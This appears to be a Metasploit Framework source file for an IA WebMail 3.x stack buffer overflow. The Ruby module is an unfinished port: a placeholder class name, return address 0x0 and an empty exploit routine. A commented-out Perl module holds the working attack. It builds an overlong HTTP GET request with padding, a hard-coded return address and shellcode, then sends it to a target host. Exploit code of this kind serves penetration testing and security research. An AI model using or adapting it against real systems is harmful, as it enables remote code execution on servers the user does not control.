require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'IA WebMail 3.x Buffer Overflow',
			'Description'    => %q{
				This exploits a stack overflow in the IA WebMail server.
				This exploit has not been tested against a live system at
				this time.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '2757'],
					[ 'URL', 'http://www.k-otik.net/exploits/11.19.iawebmail.pl.php'],
					[ 'MIL', '24'],

				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32, win2000',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Nov 3 2003',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::ia_webmail;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'  => 'IA WebMail 3.x Buffer Overflow',
	'Version'  => '$Revision$',
	'Authors' => [ 'H D Moore <hdm [at] metasploit.com>', ],

	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000' ],
	'Priv'  => 0,

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 80],
	  },

	'Payload' =>
	  {
		'Space'  => 1024,
		'BadChars'  => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",
	  },

	'Description'  =>  Pex::Text::Freeform(qq{
        This exploits a stack overflow in the IA WebMail server. This
        exploit has not been tested against a live system at this time.
}),

	'Refs'  =>
	  [
		['OSVDB', 2757],
		['URL',   'http://www.k-otik.net/exploits/11.19.iawebmail.pl.php'],
		['MIL',   '24'],
	  ],

	'DefaultTarget' => 0,
	'Targets' => [['IA WebMail 3.x', 1036, 0x1002bd33]],

	'Keys' => ['iawebmail'],

	'DisclosureDate' => 'Nov 3 2003',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

# This exploit based on http://www.k-otik.net/exploits/11.19.iawebmail.pl.php
sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;

	my @targets = @{$self->Targets};
	my $target = $targets[$target_idx];

	$self->PrintLine("[*] Attempting to exploit target " . $target->[0]);

	my $request = "GET /" . ("o" x $target->[1]) . "META" .
	  pack("V", $target->[2]). $shellcode .
	  " HTTP/1.0\r\n\r\n";

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$self->PrintLine("[*] Sending " .length($request) . " bytes to remote host.");
	$s->Send($request);

	$self->PrintLine("[*] Waiting for a response...");
	my $r = $s->Recv(-1, 5);
	sleep(2);
	$s->Close();
	return;
}

=end


end
end	
